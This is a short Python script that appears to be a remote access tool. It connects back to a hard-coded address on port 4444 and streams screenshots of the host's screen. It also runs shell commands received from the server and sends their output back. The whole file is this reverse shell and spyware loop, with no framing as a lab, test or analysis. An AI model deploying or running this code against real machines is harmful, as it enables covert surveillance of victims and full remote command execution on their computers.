import socket
import subprocess
import pyautogui
import io
import time

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.200.27", 4444))
    
    try:
        while True:
            # Capture screenshot
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_data = img_byte_arr.getvalue()

            # Send the screenshot to the server
            client_socket.sendall(b"SCREENSHOT" + img_data)

            # Wait for the server's command
            command = client_socket.recv(1024).decode()

            if command.lower() == "exit":
                break

            # Execute the command and send the result back to the server
            output = subprocess.getoutput(command)
            if not output:
                output = "Command executed."
            client_socket.sendall(output.encode())

            # Sleep to avoid flooding the server with screenshots
            time.sleep(1)

    except Exception as e:
        print(f"Error: {e}")
    
    client_socket.close()

if __name__ == "__main__":
    connect_to_server()
